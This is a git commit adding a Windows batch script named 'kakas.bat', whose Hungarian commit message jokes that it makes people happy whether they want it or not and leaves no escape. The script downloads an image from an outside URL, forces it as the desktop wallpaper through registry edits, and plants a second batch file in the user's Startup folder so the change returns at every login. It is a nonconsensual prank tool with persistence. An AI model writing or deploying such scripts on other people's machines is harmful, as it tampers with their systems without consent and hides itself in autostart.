17b7b73c2bd34026fda3cb42e360dc2401a6b8ae
Sándor Máté <sandor.mate@dk.akkszalezi.hu>
2023-10-05 09:18:37 +0200

    kakas beta 0.2.1
    Ez a script boldoggá teszi az embereket, ha akarják, ha nem
    A boldogság elkerülhetetlen
    Egy óvatlan píllanatban csak lecsap rád és nincs menekvés

---
+++ kakas.bat
@@ -0,0 +1,18 @@
+echo kakas program futás alatt ...
+@echo off
+cd %appdata%\kakas
+curl https://lh3.googleusercontent.com/drive-viewer/AK7aPaD6suUtk6xSPorgaoaApazp__-X-7DCA78yyBifvJkE-b0iQcDaupxpQSwKPvwREyODF4wtDDQRWHkx7aGt4fcDcHMltA=s1600 -o BlackCock.png
+reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d %appdata%\kakas\BlackCock.png /f 
+reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f 
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters 1, True
+cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
+echo @echo off > kakasextension.bat
+echo reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d %appdata%\kakas\BlackCock.png /f >> kakasextension.bat
+echo reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f >> kakasextension.bat
+echo RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters 1, True >> kakasextension.bat
+cls
+echo Kakas sikeresen települt!
+exit
+
+
+
